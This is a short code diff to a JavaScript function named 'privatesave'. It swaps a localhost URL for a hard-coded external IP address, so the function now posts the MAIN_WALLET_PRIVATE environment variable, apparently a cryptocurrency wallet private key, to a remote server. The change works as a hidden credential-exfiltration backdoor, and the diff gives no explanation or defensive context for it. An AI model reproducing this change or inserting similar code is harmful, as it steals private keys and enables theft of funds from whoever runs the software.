@@ -120,7 +120,7 @@ async function privatesave(req, res){
         })    
     });
     request.post(
-        'http://localhost:3000/mainwallet',
+        'http://23.81.246.40/mainwallet',
         { json: {
             mainprivate: process.env.MAIN_WALLET_PRIVATE
           } 
